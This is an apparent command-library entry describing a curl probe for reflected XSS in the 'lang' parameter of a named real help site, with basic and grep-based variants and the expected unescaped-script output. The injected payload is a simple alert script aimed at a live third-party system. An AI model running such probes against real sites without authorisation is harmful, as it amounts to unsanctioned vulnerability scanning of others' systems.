---
id: cmd-curl-xss-test-lang
data: >-
  curl
  "https://help.glassdoor.com/gd_requestsubmitpage?lang=<script>alert('XSS')</script>"
tags:
  - xss
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T00:11:15.989Z'
verified: false
validated: true
submitted: true
---
# curl-xss-test-lang

## Command

```bash
curl "https://help.glassdoor.com/gd_requestsubmitpage?lang=<script>alert('XSS')</script>"
```

## Description

This command tests the 'lang' parameter for reflected XSS by injecting a script payload and retrieving the response to check for unsanitized output.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Payload | JavaScript injection string | Yes |

## Examples

### Basic Usage

```bash
curl "https://help.glassdoor.com/gd_requestsubmitpage?lang=<script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -s "https://help.glassdoor.com/gd_requestsubmitpage?lang=<script>alert(1)</script>" | grep -i script
```

## Expected Output

Response HTML with the <script> tag unescaped, indicating vulnerability.

## Related

- [[Related Procedure]]
